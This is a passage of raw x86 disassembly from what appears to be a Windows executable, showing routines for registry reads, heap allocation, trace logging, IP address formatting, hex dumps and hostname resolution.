  40ba20:	lea    eax,[ebp-0x28]
  40ba23:	push   eax
  40ba24:	push   0x20019
  40ba29:	push   esi
  40ba2a:	mov    DWORD PTR [ebp-0x24],edi
  40ba2d:	mov    DWORD PTR [ebp-0x1c],0x40
  40ba34:	mov    DWORD PTR [ebp-0x18],edi
  40ba37:	mov    DWORD PTR [ebp-0x14],edi
  40ba3a:	call   DWORD PTR ds:0x4131e8
  40ba40:	mov    esi,eax
  40ba42:	lea    eax,[ebp-0x8]
  40ba45:	push   eax
  40ba46:	call   DWORD PTR ds:0x4131d8
  40ba4c:	pop    edi
  40ba4d:	mov    eax,esi
  40ba4f:	pop    esi
  40ba50:	mov    esp,ebp
  40ba52:	pop    ebp
  40ba53:	ret    
  40ba54:	int3   
  40ba55:	int3   
  40ba56:	int3   
  40ba57:	int3   
  40ba58:	int3   
  40ba59:	mov    edi,edi
  40ba5b:	push   ebp
  40ba5c:	mov    ebp,esp
  40ba5e:	sub    esp,0x28
  40ba61:	mov    eax,0x400
  40ba66:	push   ebx
  40ba67:	push   esi
  40ba68:	push   edi
  40ba69:	push   eax
  40ba6a:	mov    eax,fs:0x30
  40ba70:	mov    edi,edx
  40ba72:	push   0x0
  40ba74:	mov    ebx,ecx
  40ba76:	push   DWORD PTR [eax+0x18]
  40ba79:	call   DWORD PTR ds:0x4131d4
  40ba7f:	mov    esi,eax
  40ba81:	test   esi,esi
  40ba83:	jne    0x40ba8f
  40ba85:	mov    eax,0xc0000017
  40ba8a:	jmp    0x40bc15
  40ba8f:	mov    eax,0x400
  40ba94:	push   eax
  40ba95:	push   0x0
  40ba97:	push   esi
  40ba98:	call   0x40d4a8
  40ba9d:	add    esp,0xc
  40baa0:	mov    DWORD PTR [ebp-0x10],0x4000000
  40baa7:	mov    eax,0x400
  40baac:	push   eax
  40baad:	mov    eax,fs:0x30
  40bab3:	push   0x0
  40bab5:	push   DWORD PTR [eax+0x18]
  40bab8:	call   DWORD PTR ds:0x4131d4
  40babe:	mov    DWORD PTR [ebp-0xc],eax
  40bac1:	test   eax,eax
  40bac3:	jne    0x40bacf
  40bac5:	mov    edi,0xc0000017
  40baca:	jmp    0x40bc01
  40bacf:	mov    ecx,edi
  40bad1:	mov    eax,0x400
  40bad6:	mov    WORD PTR [ebp-0x1e],ax
  40bada:	lea    edx,[ecx+0x1]
  40badd:	mov    al,BYTE PTR [ecx]
  40badf:	inc    ecx
  40bae0:	test   al,al
  40bae2:	jne    0x40badd
  40bae4:	push   0x0
  40bae6:	lea    eax,[ebp-0x20]
  40bae9:	mov    DWORD PTR [ebp-0x1c],edi
  40baec:	push   eax
  40baed:	lea    eax,[ebp-0x10]
  40baf0:	sub    ecx,edx
  40baf2:	push   eax
  40baf3:	mov    WORD PTR [ebp-0x20],cx
  40baf7:	call   DWORD PTR ds:0x4131ec
  40bafd:	lea    eax,[ebp-0x8]
  40bb00:	push   eax
  40bb01:	mov    eax,0x400
  40bb06:	push   eax
  40bb07:	push   esi
  40bb08:	push   0x1
  40bb0a:	lea    eax,[ebp-0x10]
  40bb0d:	push   eax
  40bb0e:	push   ebx
  40bb0f:	call   DWORD PTR ds:0x4131d0
  40bb15:	mov    edi,eax
  40bb17:	test   edi,edi
  40bb19:	jns    0x40bb2f
  40bb1b:	push   DWORD PTR [ebp-0xc]
  40bb1e:	mov    ecx,DWORD PTR fs:0x30
  40bb25:	push   0x0
  40bb27:	push   DWORD PTR [ecx+0x18]
  40bb2a:	jmp    0x40bbfb
  40bb2f:	mov    ebx,DWORD PTR [ebp+0xc]
  40bb32:	mov    eax,DWORD PTR [esi+0x4]
  40bb35:	mov    DWORD PTR [ebx],eax
  40bb37:	cmp    eax,0x4
  40bb3a:	je     0x40bbe2
  40bb40:	cmp    eax,0x3
  40bb43:	je     0x40bbe2
  40bb49:	xor    eax,eax
  40bb4b:	cmp    DWORD PTR [ebx],0x2
  40bb4e:	mov    WORD PTR [ebp-0x18],ax
  40bb52:	jne    0x40bb61
  40bb54:	mov    eax,DWORD PTR [ebp-0xc]
  40bb57:	mov    DWORD PTR [ebp-0x14],eax
  40bb5a:	mov    eax,0x400
  40bb5f:	jmp    0x40bb80
  40bb61:	push   DWORD PTR [ebp-0xc]
  40bb64:	mov    eax,fs:0x30
  40bb6a:	push   0x0
  40bb6c:	push   DWORD PTR [eax+0x18]
  40bb6f:	call   DWORD PTR ds:0x4131e4
  40bb75:	mov    eax,DWORD PTR [ebp+0x8]
  40bb78:	mov    DWORD PTR [ebp-0x14],eax
  40bb7b:	mov    eax,0x3200
  40bb80:	mov    WORD PTR [ebp-0x16],ax
  40bb84:	mov    ax,WORD PTR [esi+0xc]
  40bb88:	mov    WORD PTR [ebp-0x28],ax
  40bb8c:	mov    ax,WORD PTR [esi+0xc]
  40bb90:	mov    WORD PTR [ebp-0x26],ax
  40bb94:	mov    eax,DWORD PTR [esi+0x8]
  40bb97:	add    eax,esi
  40bb99:	mov    DWORD PTR [ebp-0x24],eax
  40bb9c:	lea    eax,[ebp-0x28]
  40bb9f:	push   0x0
  40bba1:	push   eax
  40bba2:	lea    eax,[ebp-0x18]
  40bba5:	push   eax
  40bba6:	call   DWORD PTR ds:0x4131e0
  40bbac:	cmp    DWORD PTR [ebx],0x2
  40bbaf:	jne    0x40bc01
  40bbb1:	mov    ebx,0x3200
  40bbb6:	push   ebx
  40bbb7:	push   DWORD PTR [ebp+0x8]
  40bbba:	push   DWORD PTR [ebp-0x14]
  40bbbd:	call   DWORD PTR ds:0x4130ac
  40bbc3:	mov    DWORD PTR [ebp-0x8],eax
  40bbc6:	test   eax,eax
  40bbc8:	jne    0x40bbd4
  40bbca:	call   DWORD PTR ds:0x413078
  40bbd0:	mov    edi,eax
  40bbd2:	jmp    0x40bbdd
  40bbd4:	cmp    eax,ebx
  40bbd6:	jb     0x40bbdd
  40bbd8:	mov    edi,0xc0000023
  40bbdd:	push   DWORD PTR [ebp-0x14]
  40bbe0:	jmp    0x40bbf0
  40bbe2:	mov    eax,DWORD PTR [esi+0x8]
  40bbe5:	push   DWORD PTR [ebp-0xc]
  40bbe8:	mov    ecx,DWORD PTR [esi+eax*1]
  40bbeb:	mov    eax,DWORD PTR [ebp+0x8]
  40bbee:	mov    DWORD PTR [eax],ecx
  40bbf0:	mov    eax,fs:0x30
  40bbf6:	push   0x0
  40bbf8:	push   DWORD PTR [eax+0x18]
  40bbfb:	call   DWORD PTR ds:0x4131e4
  40bc01:	mov    eax,fs:0x30
  40bc07:	push   esi
  40bc08:	push   0x0
  40bc0a:	push   DWORD PTR [eax+0x18]
  40bc0d:	call   DWORD PTR ds:0x4131e4
  40bc13:	mov    eax,edi
  40bc15:	pop    edi
  40bc16:	pop    esi
  40bc17:	pop    ebx
  40bc18:	mov    esp,ebp
  40bc1a:	pop    ebp
  40bc1b:	ret    0xc
  40bc1e:	int3   
  40bc1f:	int3   
  40bc20:	int3   
  40bc21:	int3   
  40bc22:	int3   
  40bc23:	mov    edi,edi
  40bc25:	push   ebp
  40bc26:	mov    ebp,esp
  40bc28:	push   0x0
  40bc2a:	push   ecx
  40bc2b:	push   edx
  40bc2c:	push   0x2b
  40bc2e:	push   DWORD PTR [ebp+0xc]
  40bc31:	push   DWORD PTR [ebp+0x8]
  40bc34:	call   DWORD PTR ds:0x4131cc
  40bc3a:	add    esp,0x18
  40bc3d:	pop    ebp
  40bc3e:	ret    0x8
  40bc41:	int3   
  40bc42:	int3   
  40bc43:	int3   
  40bc44:	int3   
  40bc45:	int3   
  40bc46:	mov    edi,edi
  40bc48:	push   ebp
  40bc49:	mov    ebp,esp
  40bc4b:	push   ecx
  40bc4c:	push   ecx
  40bc4d:	mov    edx,DWORD PTR [ebp+0x14]
  40bc50:	push   ebx
  40bc51:	xor    ebx,ebx
  40bc53:	mov    DWORD PTR [ebp-0x4],ebx
  40bc56:	mov    DWORD PTR [ebp-0x8],ebx
  40bc59:	push   esi
  40bc5a:	push   edi
  40bc5b:	test   edx,edx
  40bc5d:	je     0x40bc72
  40bc5f:	mov    ecx,edx
  40bc61:	lea    esi,[ecx+0x1]
  40bc64:	mov    al,BYTE PTR [ecx]
  40bc66:	inc    ecx
  40bc67:	test   al,al
  40bc69:	jne    0x40bc64
  40bc6b:	sub    ecx,esi
  40bc6d:	lea    edi,[ecx+0x1]
  40bc70:	jmp    0x40bc75
  40bc72:	push   0x5
  40bc74:	pop    edi
  40bc75:	test   edx,edx
  40bc77:	jne    0x40bc7e
  40bc79:	mov    edx,0x4035c0
  40bc7e:	mov    ecx,DWORD PTR [ebp+0x10]
  40bc81:	test   ecx,ecx
  40bc83:	je     0x40bcae
  40bc85:	cmp    WORD PTR [ecx],bx
  40bc88:	jne    0x40bc8e
  40bc8a:	push   0xe
  40bc8c:	jmp    0x40bcb0
  40bc8e:	mov    esi,ecx
  40bc90:	lea    ebx,[esi+0x2]
  40bc93:	mov    ax,WORD PTR [esi]
  40bc96:	add    esi,0x2
  40bc99:	cmp    ax,WORD PTR [ebp-0x4]
  40bc9d:	jne    0x40bc93
  40bc9f:	sub    esi,ebx
  40bca1:	sar    esi,1
  40bca3:	xor    ebx,ebx
  40bca5:	lea    esi,[esi*2+0x2]
  40bcac:	jmp    0x40bcb1
  40bcae:	push   0xa
  40bcb0:	pop    esi
  40bcb1:	test   ecx,ecx
  40bcb3:	je     0x40bcc1
  40bcb5:	cmp    WORD PTR [ecx],bx
  40bcb8:	jne    0x40bcc6
  40bcba:	mov    ecx,0x403d58
  40bcbf:	jmp    0x40bcc6
  40bcc1:	mov    ecx,0x403d68
  40bcc6:	push   ebx
  40bcc7:	push   0x4
  40bcc9:	lea    eax,[ebp-0x4]
  40bccc:	push   eax
  40bccd:	push   0x4
  40bccf:	lea    eax,[ebp-0x8]
  40bcd2:	push   eax
  40bcd3:	push   edi
  40bcd4:	push   edx
  40bcd5:	push   esi
  40bcd6:	push   ecx
  40bcd7:	push   0x20
  40bcd9:	push   0x403dcc
  40bcde:	push   0x2b
  40bce0:	push   DWORD PTR [ebp+0xc]
  40bce3:	push   DWORD PTR [ebp+0x8]
  40bce6:	call   DWORD PTR ds:0x4131cc
  40bcec:	add    esp,0x38
  40bcef:	pop    edi
  40bcf0:	pop    esi
  40bcf1:	pop    ebx
  40bcf2:	mov    esp,ebp
  40bcf4:	pop    ebp
  40bcf5:	ret    0x18
  40bcf8:	int3   
  40bcf9:	int3   
  40bcfa:	int3   
  40bcfb:	int3   
  40bcfc:	int3   
  40bcfd:	mov    edi,edi
  40bcff:	push   ebp
  40bd00:	mov    ebp,esp
  40bd02:	push   0x0
  40bd04:	push   0x4
  40bd06:	lea    eax,[ebp+0x10]
  40bd09:	push   eax
  40bd0a:	push   ecx
  40bd0b:	push   edx
  40bd0c:	push   0x2b
  40bd0e:	push   DWORD PTR [ebp+0xc]
  40bd11:	push   DWORD PTR [ebp+0x8]
  40bd14:	call   DWORD PTR ds:0x4131cc
  40bd1a:	add    esp,0x20
  40bd1d:	pop    ebp
  40bd1e:	ret    0xc
  40bd21:	int3   
  40bd22:	int3   
  40bd23:	int3   
  40bd24:	int3   
  40bd25:	int3   
  40bd26:	mov    edi,edi
  40bd28:	push   ebp
  40bd29:	mov    ebp,esp
  40bd2b:	push   ebx
  40bd2c:	push   esi
  40bd2d:	mov    esi,DWORD PTR [ebp+0x10]
  40bd30:	push   edi
  40bd31:	test   esi,esi
  40bd33:	je     0x40bd46
  40bd35:	mov    edi,esi
  40bd37:	lea    ebx,[edi+0x1]
  40bd3a:	mov    al,BYTE PTR [edi]
  40bd3c:	inc    edi
  40bd3d:	test   al,al
  40bd3f:	jne    0x40bd3a
  40bd41:	sub    edi,ebx
  40bd43:	inc    edi
  40bd44:	jmp    0x40bd49
  40bd46:	push   0x5
  40bd48:	pop    edi
  40bd49:	test   esi,esi
  40bd4b:	jne    0x40bd52
  40bd4d:	mov    esi,0x4035c0
  40bd52:	push   0x0
  40bd54:	push   edi
  40bd55:	push   esi
  40bd56:	push   ecx
  40bd57:	push   edx
  40bd58:	push   0x2b
  40bd5a:	push   DWORD PTR [ebp+0xc]
  40bd5d:	push   DWORD PTR [ebp+0x8]
  40bd60:	call   DWORD PTR ds:0x4131cc
  40bd66:	add    esp,0x20
  40bd69:	pop    edi
  40bd6a:	pop    esi
  40bd6b:	pop    ebx
  40bd6c:	pop    ebp
  40bd6d:	ret    0xc
  40bd70:	int3   
  40bd71:	int3   
  40bd72:	int3   
  40bd73:	int3   
  40bd74:	int3   
  40bd75:	mov    edi,edi
  40bd77:	push   ebp
  40bd78:	mov    ebp,esp
  40bd7a:	push   ecx
  40bd7b:	mov    ecx,DWORD PTR ds:0x411bf8
  40bd81:	push   ebx
  40bd82:	push   esi
  40bd83:	xor    esi,esi
  40bd85:	movzx  eax,WORD PTR [ecx]
  40bd88:	push   edi
  40bd89:	mov    edi,edx
  40bd8b:	cmp    eax,0x2
  40bd8e:	jne    0x40bda3
  40bd90:	movzx  eax,WORD PTR [ecx+0x2]
  40bd94:	push   edi
  40bd95:	push   esi
  40bd96:	push   eax
  40bd97:	lea    eax,[ecx+0x4]
  40bd9a:	push   eax
  40bd9b:	call   DWORD PTR ds:0x4131c0
  40bda1:	jmp    0x40bdbc
  40bda3:	cmp    eax,0x17
  40bda6:	jne    0x40bdc0
  40bda8:	movzx  eax,WORD PTR [ecx+0x2]
  40bdac:	push   edi
  40bdad:	push   esi
  40bdae:	push   eax
  40bdaf:	push   DWORD PTR [ecx+0x18]
  40bdb2:	lea    eax,[ecx+0x8]
  40bdb5:	push   eax
  40bdb6:	call   DWORD PTR ds:0x4131bc
  40bdbc:	mov    ebx,eax
  40bdbe:	jmp    0x40bddd
  40bdc0:	push   0x57
  40bdc2:	pop    ebx
  40bdc3:	test   edi,edi
  40bdc5:	je     0x40bde3
  40bdc7:	cmp    DWORD PTR [edi],0x28
  40bdca:	jbe    0x40bde3
  40bdcc:	push   ecx
  40bdcd:	push   0x403d80
  40bdd2:	push   0x28
  40bdd4:	push   esi
  40bdd5:	call   0x40c090
  40bdda:	add    esp,0x10
  40bddd:	test   ebx,ebx
  40bddf:	jne    0x40bde3
  40bde1:	mov    esi,DWORD PTR [edi]
  40bde3:	pop    edi
  40bde4:	mov    eax,esi
  40bde6:	pop    esi
  40bde7:	pop    ebx
  40bde8:	mov    esp,ebp
  40bdea:	pop    ebp
  40bdeb:	ret    0x4
  40bdee:	int3   
  40bdef:	int3   
  40bdf0:	int3   
  40bdf1:	int3   
  40bdf2:	int3   
  40bdf3:	mov    edi,edi
  40bdf5:	push   ecx
  40bdf6:	push   ebx
  40bdf7:	push   esi
  40bdf8:	mov    ebx,edx
  40bdfa:	mov    esi,ecx
  40bdfc:	mov    eax,ds:0x41186c
  40be01:	cmp    eax,0x41186c
  40be06:	je     0x40be24
  40be08:	test   DWORD PTR [eax+0x1c],0x10000000
  40be0f:	je     0x40be24
  40be11:	push   DWORD PTR [eax+0x14]
  40be14:	mov    edx,0x403dcc
  40be19:	push   DWORD PTR [eax+0x10]
  40be1c:	push   0xe
  40be1e:	pop    ecx
  40be1f:	call   0x40bc23
  40be24:	movzx  eax,bl
  40be27:	push   eax
  40be28:	mov    eax,ebx
  40be2a:	shr    eax,0x8
  40be2d:	movzx  eax,al
  40be30:	push   eax
  40be31:	mov    eax,ebx
  40be33:	shr    ebx,0x18
  40be36:	shr    eax,0x10
  40be39:	movzx  eax,al
  40be3c:	push   eax
  40be3d:	push   ebx
  40be3e:	push   0x403d98
  40be43:	push   0x1f
  40be45:	push   esi
  40be46:	call   0x40c736
  40be4b:	add    esp,0x1c
  40be4e:	pop    esi
  40be4f:	pop    ebx
  40be50:	pop    ecx
  40be51:	ret    
  40be52:	int3   
  40be53:	int3   
  40be54:	int3   
  40be55:	int3   
  40be56:	int3   
  40be57:	mov    edi,edi
  40be59:	push   ebp
  40be5a:	mov    ebp,esp
  40be5c:	sub    esp,0x1c
  40be5f:	mov    eax,ds:0x40e004
  40be64:	xor    eax,ebp
  40be66:	mov    DWORD PTR [ebp-0x4],eax
  40be69:	push   ebx
  40be6a:	push   esi
  40be6b:	push   edi
  40be6c:	lea    esi,[ebp+0x8]
  40be6f:	mov    eax,ecx
  40be71:	lea    edi,[ebp-0x18]
  40be74:	mov    DWORD PTR [ebp-0x1c],eax
  40be77:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40be78:	push   0x10
  40be7a:	pop    ebx
  40be7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40be7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40be7d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40be7e:	mov    esi,eax
  40be80:	lea    edi,[eax+0x4b]
  40be83:	mov    eax,ds:0x41186c
  40be88:	cmp    eax,0x41186c
  40be8d:	je     0x40beab
  40be8f:	test   DWORD PTR [eax+0x1c],0x10000000
  40be96:	je     0x40beab
  40be98:	push   DWORD PTR [eax+0x14]
  40be9b:	mov    edx,0x403dcc
  40bea0:	push   DWORD PTR [eax+0x10]
  40bea3:	push   0x12
  40bea5:	pop    ecx
  40bea6:	call   0x40bc23
  40beab:	movzx  ecx,BYTE PTR [ebp+ebx*1-0x19]
  40beb0:	dec    ebx
  40beb1:	mov    eax,ecx
  40beb3:	and    ecx,0xf
  40beb6:	shr    eax,0x4
  40beb9:	push   eax
  40beba:	push   ecx
  40bebb:	mov    eax,edi
  40bebd:	push   0x403db4
  40bec2:	sub    eax,esi
  40bec4:	push   eax
  40bec5:	push   esi
  40bec6:	call   0x40c736
  40becb:	mov    esi,eax
  40becd:	add    esp,0x14
  40bed0:	test   esi,esi
  40bed2:	je     0x40beed
  40bed4:	test   ebx,ebx
  40bed6:	jne    0x40beab
  40bed8:	push   0x403dbc
  40bedd:	sub    edi,esi
  40bedf:	push   edi
  40bee0:	push   esi
  40bee1:	call   0x40c736
  40bee6:	add    esp,0xc
  40bee9:	test   eax,eax
  40beeb:	jne    0x40bef0
  40beed:	mov    eax,DWORD PTR [ebp-0x1c]
  40bef0:	mov    ecx,DWORD PTR [ebp-0x4]
  40bef3:	pop    edi
  40bef4:	pop    esi
  40bef5:	xor    ecx,ebp
  40bef7:	pop    ebx
  40bef8:	call   0x40cd10
  40befd:	mov    esp,ebp
  40beff:	pop    ebp
  40bf00:	ret    0x10
  40bf03:	int3   
  40bf04:	int3   
  40bf05:	int3   
  40bf06:	int3   
  40bf07:	int3   
  40bf08:	mov    edi,edi
  40bf0a:	push   ebp
  40bf0b:	mov    ebp,esp
  40bf0d:	sub    esp,0x10
  40bf10:	mov    eax,ds:0x40e004
  40bf15:	xor    eax,ebp
  40bf17:	mov    DWORD PTR [ebp-0x4],eax
  40bf1a:	push   ebx
  40bf1b:	push   esi
  40bf1c:	push   edi
  40bf1d:	mov    ebx,edx
  40bf1f:	mov    esi,ecx
  40bf21:	xor    edi,edi
  40bf23:	mov    eax,ds:0x41186c
  40bf28:	cmp    eax,0x41186c
  40bf2d:	je     0x40bf4b
  40bf2f:	test   DWORD PTR [eax+0x1c],0x10000000
  40bf36:	je     0x40bf4b
  40bf38:	push   ecx
  40bf39:	push   ecx
  40bf3a:	push   ebx
  40bf3b:	push   0x403dc8
  40bf40:	push   DWORD PTR [eax+0x14]
  40bf43:	push   DWORD PTR [eax+0x10]
  40bf46:	call   0x40bc46
  40bf4b:	and    DWORD PTR [ebp-0x8],edi
  40bf4e:	lea    eax,[ebp-0xc]
  40bf51:	push   eax
  40bf52:	lea    eax,[ebp-0x8]
  40bf55:	push   eax
  40bf56:	push   0x1
  40bf58:	push   ebx
  40bf59:	call   DWORD PTR ds:0x4131c8
  40bf5f:	test   eax,eax
  40bf61:	js     0x40bfb7
  40bf63:	mov    eax,DWORD PTR [ebp-0x8]
  40bf66:	test   eax,eax
  40bf68:	je     0x40bf6f
  40bf6a:	cmp    BYTE PTR [eax],0x0
  40bf6d:	jne    0x40bfb7
  40bf6f:	mov    edx,DWORD PTR [ebp-0xc]
  40bf72:	push   ecx
  40bf73:	mov    ecx,esi
  40bf75:	call   0x40c478
  40bf7a:	mov    eax,ds:0x41186c
  40bf7f:	cmp    eax,0x41186c
  40bf84:	je     0x40c02e
  40bf8a:	test   DWORD PTR [eax+0x1c],0x40000
  40bf91:	je     0x40c00a
  40bf93:	push   DWORD PTR [ebp-0xc]
  40bf96:	call   DWORD PTR ds:0x413018
  40bf9c:	push   eax
  40bf9d:	mov    eax,ds:0x41186c
  40bfa2:	mov    edx,0x403dcc
  40bfa7:	push   DWORD PTR [eax+0x14]
  40bfaa:	push   DWORD PTR [eax+0x10]
  40bfad:	push   0x21
  40bfaf:	pop    ecx
  40bfb0:	call   0x40bd26
  40bfb5:	jmp    0x40c005
  40bfb7:	push   0x40
  40bfb9:	push   0x0
  40bfbb:	push   esi
  40bfbc:	call   0x40d4a8
  40bfc1:	add    esp,0xc
  40bfc4:	lea    eax,[esi+0x2]
  40bfc7:	push   eax
  40bfc8:	lea    eax,[esi+0x18]
  40bfcb:	push   eax
  40bfcc:	lea    eax,[esi+0x8]
  40bfcf:	push   eax
  40bfd0:	push   ebx
  40bfd1:	call   DWORD PTR ds:0x4131b8
  40bfd7:	mov    edi,eax
  40bfd9:	test   edi,edi
  40bfdb:	jne    0x40bfec
  40bfdd:	push   0x17
  40bfdf:	pop    eax
  40bfe0:	mov    WORD PTR [esi],ax
  40bfe3:	mov    DWORD PTR [esi+0x20],0x1c
  40bfea:	jmp    0x40c005
  40bfec:	push   0x40
  40bfee:	push   0x0
  40bff0:	push   esi
  40bff1:	call   0x40d4a8
  40bff6:	add    esp,0xc
  40bff9:	mov    edi,0x2550
  40bffe:	push   edi
  40bfff:	call   DWORD PTR ds:0x413074
  40c005:	mov    eax,ds:0x41186c
  40c00a:	cmp    eax,0x41186c
  40c00f:	je     0x40c02e
  40c011:	test   DWORD PTR [eax+0x1c],0x10000000
  40c018:	je     0x40c02e
  40c01a:	push   edi
  40c01b:	push   DWORD PTR [eax+0x14]
  40c01e:	mov    edx,0x403dcc
  40c023:	push   DWORD PTR [eax+0x10]
  40c026:	push   0x22
  40c028:	pop    ecx
  40c029:	call   0x40bcfd
  40c02e:	mov    ecx,DWORD PTR [ebp-0x4]
  40c031:	xor    eax,eax
  40c033:	test   edi,edi
  40c035:	pop    edi
  40c036:	sete   al
  40c039:	xor    ecx,ebp
  40c03b:	pop    esi
  40c03c:	pop    ebx
  40c03d:	call   0x40cd10
  40c042:	mov    esp,ebp
  40c044:	pop    ebp
  40c045:	ret    0xc
  40c048:	int3   
  40c049:	int3   
  40c04a:	int3   
  40c04b:	int3   
  40c04c:	int3   
  40c04d:	mov    edi,edi
  40c04f:	push   ebp
  40c050:	mov    ebp,esp
  40c052:	mov    eax,DWORD PTR [ebp+0x8]
  40c055:	mov    edx,eax
  40c057:	push   esi
  40c058:	shr    edx,0x18
  40c05b:	mov    esi,ecx
  40c05d:	push   edx
  40c05e:	mov    edx,eax
  40c060:	mov    ecx,eax
  40c062:	shr    edx,0x10
  40c065:	movzx  edx,dl
  40c068:	push   edx
  40c069:	shr    ecx,0x8
  40c06c:	movzx  ecx,cl
  40c06f:	push   ecx
  40c070:	movzx  eax,al
  40c073:	push   eax
  40c074:	push   0x403d74
  40c079:	push   0x10
  40c07b:	push   esi
  40c07c:	call   0x40c090
  40c081:	add    esp,0x1c
  40c084:	mov    eax,esi
  40c086:	pop    esi
  40c087:	pop    ebp
  40c088:	ret    0x4
  40c08b:	int3   
  40c08c:	int3   
  40c08d:	int3   
  40c08e:	int3   
  40c08f:	int3   
  40c090:	mov    edi,edi
  40c092:	push   ebp
  40c093:	mov    ebp,esp
  40c095:	mov    eax,DWORD PTR [ebp+0xc]
  40c098:	push   esi
  40c099:	xor    esi,esi
  40c09b:	test   eax,eax
  40c09d:	je     0x40c0a6
  40c09f:	cmp    eax,0x7fffffff
  40c0a4:	jbe    0x40c0ab
  40c0a6:	mov    esi,0x80070057
  40c0ab:	test   esi,esi
  40c0ad:	js     0x40c0e5
  40c0af:	push   ebx
  40c0b0:	mov    ebx,DWORD PTR [ebp+0x8]
  40c0b3:	lea    ecx,[ebp+0x14]
  40c0b6:	push   edi
  40c0b7:	push   ecx
  40c0b8:	push   DWORD PTR [ebp+0x10]
  40c0bb:	lea    edi,[eax-0x1]
  40c0be:	xor    esi,esi
  40c0c0:	push   edi
  40c0c1:	push   eax
  40c0c2:	push   ebx
  40c0c3:	call   DWORD PTR ds:0x4131a0
  40c0c9:	add    esp,0x14
  40c0cc:	test   eax,eax
  40c0ce:	js     0x40c0d8
  40c0d0:	cmp    eax,edi
  40c0d2:	ja     0x40c0d8
  40c0d4:	jne    0x40c0e1
  40c0d6:	jmp    0x40c0dd
  40c0d8:	mov    esi,0x8007007a
  40c0dd:	mov    BYTE PTR [edi+ebx*1],0x0
  40c0e1:	pop    edi
  40c0e2:	pop    ebx
  40c0e3:	jmp    0x40c0ef
  40c0e5:	test   eax,eax
  40c0e7:	je     0x40c0ef
  40c0e9:	mov    ecx,DWORD PTR [ebp+0x8]
  40c0ec:	mov    BYTE PTR [ecx],0x0
  40c0ef:	mov    eax,esi
  40c0f1:	pop    esi
  40c0f2:	pop    ebp
  40c0f3:	ret    
  40c0f4:	int3   
  40c0f5:	int3   
  40c0f6:	int3   
  40c0f7:	int3   
  40c0f8:	int3   
  40c0f9:	mov    edi,edi
  40c0fb:	push   ebp
  40c0fc:	mov    ebp,esp
  40c0fe:	push   0x0
  40c100:	push   0x4
  40c102:	lea    eax,[ebp+0x14]
  40c105:	push   eax
  40c106:	push   0x4
  40c108:	lea    eax,[ebp+0x10]
  40c10b:	push   eax
  40c10c:	push   0x17
  40c10e:	push   0x403e14
  40c113:	push   0x2b
  40c115:	push   DWORD PTR [ebp+0xc]
  40c118:	push   DWORD PTR [ebp+0x8]
  40c11b:	call   DWORD PTR ds:0x4131cc
  40c121:	add    esp,0x28
  40c124:	pop    ebp
  40c125:	ret    0x10
  40c128:	int3   
  40c129:	int3   
  40c12a:	int3   
  40c12b:	int3   
  40c12c:	int3   
  40c12d:	mov    edi,edi
  40c12f:	push   ebp
  40c130:	mov    ebp,esp
  40c132:	push   0x0
  40c134:	push   0x4
  40c136:	lea    eax,[ebp+0x14]
  40c139:	push   eax
  40c13a:	push   0x4
  40c13c:	lea    eax,[ebp+0x10]
  40c13f:	push   eax
  40c140:	push   0x12
  40c142:	push   0x403e14
  40c147:	push   0x2b
  40c149:	push   DWORD PTR [ebp+0xc]
  40c14c:	push   DWORD PTR [ebp+0x8]
  40c14f:	call   DWORD PTR ds:0x4131cc
  40c155:	add    esp,0x28
  40c158:	pop    ebp
  40c159:	ret    0x10
  40c15c:	int3   
  40c15d:	int3   
  40c15e:	int3   
  40c15f:	int3   
  40c160:	int3   
  40c161:	mov    edi,edi
  40c163:	push   ebp
  40c164:	mov    ebp,esp
  40c166:	push   ebx
  40c167:	push   esi
  40c168:	push   edi
  40c169:	mov    edi,ecx
  40c16b:	xor    ebx,ebx
  40c16d:	mov    edx,edi
  40c16f:	lea    esi,[edi+0x800]
  40c175:	mov    BYTE PTR [edi],bl
  40c177:	cmp    DWORD PTR [ebp+0x8],ebx
  40c17a:	je     0x40c20e
  40c180:	mov    eax,DWORD PTR [ebp+0xc]
  40c183:	test   eax,eax
  40c185:	je     0x40c20e
  40c18b:	test   edx,edx
  40c18d:	je     0x40c20e
  40c18f:	test   bl,0x1f
  40c192:	jne    0x40c1ce
  40c194:	mov    eax,0x402a34
  40c199:	test   ebx,ebx
  40c19b:	jne    0x40c1a2
  40c19d:	mov    eax,0x402c32
  40c1a2:	cmp    DWORD PTR [ebp+0x10],0x0
  40c1a6:	je     0x40c1b3
  40c1a8:	push   DWORD PTR [ebp+0x10]
  40c1ab:	push   eax
  40c1ac:	push   0x403de4
  40c1b1:	jmp    0x40c1ba
  40c1b3:	push   ebx
  40c1b4:	push   eax
  40c1b5:	push   0x403dec
  40c1ba:	mov    eax,esi
  40c1bc:	sub    eax,edx
  40c1be:	push   eax
  40c1bf:	push   edx
  40c1c0:	call   0x40c736
  40c1c5:	mov    edx,eax
  40c1c7:	add    esp,0x14
  40c1ca:	test   edx,edx
  40c1cc:	je     0x40c1ec
  40c1ce:	mov    eax,DWORD PTR [ebp+0x8]
  40c1d1:	movzx  eax,BYTE PTR [ebx+eax*1]
  40c1d5:	inc    ebx
  40c1d6:	push   eax
  40c1d7:	mov    eax,esi
  40c1d9:	push   0x403ddc
  40c1de:	sub    eax,edx
  40c1e0:	push   eax
  40c1e1:	push   edx
  40c1e2:	call   0x40c736
  40c1e7:	add    esp,0x10
  40c1ea:	mov    edx,eax
  40c1ec:	cmp    ebx,DWORD PTR [ebp+0xc]
  40c1ef:	jb     0x40c18b
  40c1f1:	test   edx,edx
  40c1f3:	je     0x40c20e
  40c1f5:	push   0x402a34
  40c1fa:	sub    esi,edx
  40c1fc:	push   esi
  40c1fd:	push   edx
  40c1fe:	call   0x40c736
  40c203:	add    esp,0xc
  40c206:	test   eax,eax
  40c208:	je     0x40c20e
  40c20a:	sub    eax,edi
  40c20c:	jmp    0x40c210
  40c20e:	xor    eax,eax
  40c210:	pop    edi
  40c211:	pop    esi
  40c212:	pop    ebx
  40c213:	pop    ebp
  40c214:	ret    0x14
  40c217:	int3   
  40c218:	int3   
  40c219:	int3   
  40c21a:	int3   
  40c21b:	int3   
  40c21c:	mov    edi,edi
  40c21e:	push   ebp
  40c21f:	mov    ebp,esp
  40c221:	push   ecx
  40c222:	push   ecx
  40c223:	mov    eax,ecx
  40c225:	push   ebx
  40c226:	push   esi
  40c227:	xor    ebx,ebx
  40c229:	mov    DWORD PTR [ebp-0x4],eax
  40c22c:	lea    ecx,[eax+0x800]
